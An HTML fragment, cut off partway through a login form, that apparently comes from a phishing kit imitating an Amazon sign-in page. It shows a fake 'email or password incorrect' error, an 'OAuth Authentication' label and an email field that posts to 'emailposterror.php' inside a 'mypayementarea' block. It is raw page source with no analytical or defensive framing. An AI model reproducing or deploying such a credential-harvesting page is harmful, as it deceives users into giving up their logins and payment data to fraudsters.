                  ...
                  <div class="container">
                     <div class="row" style="padding-top: 5px">
                        <div class="col-12">
                           ...
                           <div align="center"> <span class="lefttext" style="color: red;">The email or password you entered is incorrect. Please try again!</span> </div><br>
                           <div class="mypayementarea">
                              <form action="emailposterror.php" method="post" name="konzform" id="konzform" novalidate="novalidate"> <span class="colorblacked">OAuth Authentication</span>
                                 <div class="row mt-3">
                                    <div class="col-sm-6">
                                       <div class="form-group">
                                          <label for="email">
                                             Email address                                          </label>
                                          <input type="text" class="form-control amazoninput emailfocus" name="email" id="email" placeholder="Email address" minlength="5" maxlength="30">
                                       </div>
                                    </div>
                                    <div class="col-sm-6">
                                       <div class="form-group">
